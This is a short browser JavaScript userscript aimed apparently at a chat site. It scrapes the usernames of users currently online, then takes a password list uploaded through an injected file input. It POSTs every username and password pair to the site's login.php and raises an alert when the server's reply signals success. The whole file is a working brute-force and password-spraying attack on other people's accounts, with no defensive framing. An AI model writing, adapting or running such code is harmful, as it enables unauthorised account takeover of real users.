var user_list =[];
toggleRight();
function sleep(ms) { return new Promise(resolve => setTimeout(resolve, ms));}

( async  ()=> {

   
 





await sleep(10000);


var onlineUser = document.querySelector("#container_user >div").innerText;
await sleep(2500);

var onlineUser =parseInt(onlineUser.split(/\s/gi)[1]);
await sleep(2500);

for(var i =1 ;i<44+1;){
 user_list.push(document.querySelector("#container_user > div.online_user > div:nth-child("+i+") > div.user_item_data > p").innerText);
++i

}
console.log(user_list);
localStorage.setItem("user_list",user_list);


})();	

( async  ()=> {



await sleep(15000);


$('<input type="file" name="file" id="file">').appendTo('#empty_top_mob');
function sleep(ms) { return new Promise(resolve => setTimeout(resolve, ms));}



document.getElementById('file').onchange =  function(){

  var file = this.files[0];

  var reader = new FileReader();
  reader.onload = async function(progressEvent){
var users_list =localStorage.getItem('user_list');
var users = users_list.toString();

var users = users.split(",");

for(var ii =0;ii<users.length;){


    var lines = this.result.split('\n');


    for(var line = 0; line < lines.length; ){
  

 const xhttp = new XMLHttpRequest();
  xhttp.onload = function() {

if(this.responseText=="3") {alert(lines[line])}


  }
 



xhttp.open("POST", ""+window.location.href+""+"system/encoded/login.php");
xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded; charset=UTF-8");
xhttp.send("password="+lines[line]+"&username="+users[ii]+"");

 console.log("user:"+users[ii]+ "pass:"+ lines[line]);


line++


if(line == lines.length){++ii
}
    }





}
  };
  reader.readAsText(file);
};



})();	
